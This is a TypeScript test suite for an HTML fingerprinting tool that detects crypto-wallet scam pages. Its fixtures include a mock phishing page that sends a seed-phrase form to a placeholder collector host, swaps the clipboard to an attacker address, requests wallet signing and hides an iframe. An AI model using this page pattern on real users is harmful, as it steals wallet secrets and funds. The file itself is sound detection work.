import assert from "node:assert/strict"
import test from "node:test"

import { fingerprintHtml } from "./html-fingerprint"

const maliciousFixture = `
  <!doctype html>
  <html>
    <head>
      <link rel="icon" href="/assets/icon-123.png">
      <script src="/assets/wallet-88aa99bb.js"></script>
      <script>
        const target = "0x1111111111111111111111111111111111111111";
        navigator.clipboard.writeText(target);
        window.ethereum.request({ method: "eth_requestAccounts" });
        wallet.signTransaction(payload);
        eval(atob("Y29uc29sZS5sb2coJ3gnKQ=="));
      </script>
    </head>
    <body>
      <h1>Claim reward in 10 minutes</h1>
      <form action="https://collector.example/submit">
        <input name="seed_phrase" placeholder="Enter recovery phrase">
      </form>
      <iframe style="display:none" src="https://frame.example/connect"></iframe>
    </body>
  </html>
`

test("fingerprintHtml produces deterministic Scam DNA and static danger signals", () => {
  const input = {
    html: maliciousFixture,
    sourceUrl: "https://claim.example/reward",
    finalUrl: "https://claim.example/reward",
    redirectChain: ["https://claim.example/reward"],
  }
  const first = fingerprintHtml(input)
  const second = fingerprintHtml(input)

  assert.equal(first.fingerprint.contentHash, second.fingerprint.contentHash)
  assert.equal(first.fingerprint.clusterKey, second.fingerprint.clusterKey)
  assert.ok(first.fingerprint.behaviorFlags.includes("secret_input_field"))
  assert.ok(first.fingerprint.behaviorFlags.includes("cross_origin_form"))
  assert.ok(first.fingerprint.behaviorFlags.includes("wallet_connect_request"))
  assert.ok(first.fingerprint.behaviorFlags.includes("wallet_signing_api"))
  assert.ok(first.fingerprint.behaviorFlags.includes("clipboard_access"))
  assert.ok(first.fingerprint.behaviorFlags.includes("hidden_iframe"))
  assert.ok(first.fingerprint.walletTargets.includes("0x1111111111111111111111111111111111111111"))
  assert.deepEqual(first.fingerprint.chainHints, ["evm"])
  assert.ok(first.signals.some((signal) => signal.code === "SANDBOX_SECRET_REQUEST" && signal.severity === "critical"))
  assert.ok(first.signals.some((signal) => signal.code === "SANDBOX_EXTERNAL_SECRET_FORM" && signal.severity === "critical"))
})

test("fingerprintHtml does not treat protective wallet-safety copy as a secret request", () => {
  const result = fingerprintHtml({
    html: `
      <html>
        <body>
          <main>
            <h1>Secure workspace access</h1>
            <p>Wallet signatures stay non-custodial.</p>
            <p>Tri-Proof never asks for seed phrases or private keys.</p>
            <form>
              <input type="email" name="email">
              <input type="password" name="password">
            </form>
            <p>Tri-Proof will never ask for your seed phrase, recovery phrase, or private key.</p>
          </main>
          <script>self.__next_f.push([1,"Tri-Proof will never ask for your seed phrase or private key."])</script>
        </body>
      </html>
    `,
    sourceUrl: "https://triproofprotocol.com/dashboard/airdrop",
    finalUrl: "https://triproofprotocol.com/login?next=%2Fdashboard",
    redirectChain: [
      "https://triproofprotocol.com/dashboard/airdrop",
      "https://triproofprotocol.com/login?next=%2Fdashboard",
    ],
  })

  assert.equal(result.fingerprint.behaviorFlags.includes("secret_material_request"), false)
  assert.equal(result.fingerprint.behaviorFlags.includes("secret_input_field"), false)
  assert.equal(result.signals.some((signal) => signal.code === "SANDBOX_SECRET_REQUEST"), false)
})

test("fingerprintHtml still treats an explicit visible secret request as critical", () => {
  const result = fingerprintHtml({
    html: "<html><body><h1>Verify wallet</h1><p>Enter your seed phrase to continue.</p></body></html>",
    sourceUrl: "https://claim.example/verify",
    finalUrl: "https://claim.example/verify",
    redirectChain: ["https://claim.example/verify"],
  })

  assert.ok(result.fingerprint.behaviorFlags.includes("secret_material_request"))
  assert.ok(result.signals.some((signal) => signal.code === "SANDBOX_SECRET_REQUEST" && signal.severity === "critical"))
})

test("fingerprintHtml keeps Solana and EVM integration hints distinct", () => {
  const result = fingerprintHtml({
    html: '<script>window.solana.connect(); window.ethereum.request({ method: "eth_requestAccounts" })</script>',
    sourceUrl: "https://multichain.example",
    finalUrl: "https://multichain.example",
    redirectChain: ["https://multichain.example"],
  })

  assert.deepEqual(result.fingerprint.chainHints, ["evm", "solana"])
})

test("fingerprintHtml normalizes hashed asset names across cloned domains", () => {
  const first = fingerprintHtml({
    html: '<html><head><script src="/assets/app-aabbccddeeff.js"></script></head><body><main>Wallet reward 123</main></body></html>',
    sourceUrl: "https://first.example/rewards",
    finalUrl: "https://first.example/rewards",
    redirectChain: ["https://first.example/rewards"],
  })
  const second = fingerprintHtml({
    html: '<html><head><script src="/assets/app-112233445566.js"></script></head><body><main>Wallet reward 999</main></body></html>',
    sourceUrl: "https://clone.example/rewards",
    finalUrl: "https://clone.example/rewards",
    redirectChain: ["https://clone.example/rewards"],
  })

  assert.equal(first.fingerprint.scriptHash, second.fingerprint.scriptHash)
  assert.equal(first.fingerprint.textHash, second.fingerprint.textHash)
})
